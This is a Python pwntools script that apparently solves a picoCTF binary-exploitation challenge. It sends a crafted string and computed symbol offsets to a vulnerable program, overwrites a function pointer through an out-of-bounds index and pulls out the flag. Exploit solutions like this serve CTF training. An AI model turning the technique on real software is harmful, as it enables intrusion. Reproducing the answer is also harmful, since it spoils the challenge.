import ctypes
import pwn
import re
import argparse

parser = argparse.ArgumentParser()

parser.add_argument('type', type=str)
parser.add_argument('--host', type=str)
parser.add_argument('--port', type=int)


type: str = parser.parse_args().type
host: str = parser.parse_args().host
port: int = parser.parse_args().port


elf = pwn.ELF(path='./vuln')
p = pwn.remote(host, port) if type.lower(
) == "remote" else pwn.process('./vuln')

funAddr = elf.symbols['fun']
checkAddr = elf.symbols['check']

hardCheckerAddr = elf.symbols['hard_checker']
easyCheckerAddr = elf.symbols['easy_checker']

checkOffsetInt = int(-(funAddr - checkAddr) / ctypes.sizeof(ctypes.c_int))
checkerOffset = -(hardCheckerAddr - easyCheckerAddr)

firstPayload = b'd'*13+b'%'  # ascii characters which sum is equal to 1337
secondPayload = bytes(f'{checkOffsetInt} {checkerOffset}'.encode('utf-8'))

p.recv()
p.sendline(firstPayload)
p.recv()
p.sendline(secondPayload)

res = p.recvall()
flag = re.findall(b'picoCTF{.*}', res)[0]

with open('flag.txt', 'wb') as filp:
    filp.write(flag)
